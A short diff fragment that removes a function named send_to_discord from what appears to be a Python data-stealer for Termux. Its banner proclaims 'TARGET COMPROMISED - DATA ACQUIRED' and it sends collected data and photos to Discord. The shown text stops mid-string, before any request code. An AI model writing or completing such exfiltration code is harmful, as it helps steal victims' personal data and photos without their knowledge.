@@ -180,17 +180,3 @@ def check_hacking_tools():
     
     return tools
 
-# ════════ SEND TO DISCORD ════════
-def send_to_discord(data, photos):
-    """Send collected data to Discord"""
-    print("\033[94m[3] Sending data to Discord...\033[0m")
-    
-    try:
-        # Create epic message
-        message = f"""
-```diff
-+╔══════════════════════════════════════════════════════════╗
-+║               M1 EZ HAING NOW  PH                       ║
-+║            TERMUX HUNTER v1.0 - SUCCESS!                ║
-+║           TARGET COMPROMISED - DATA ACQUIRED            ║
-+╚══════════════════════════════════════════════════════════╝
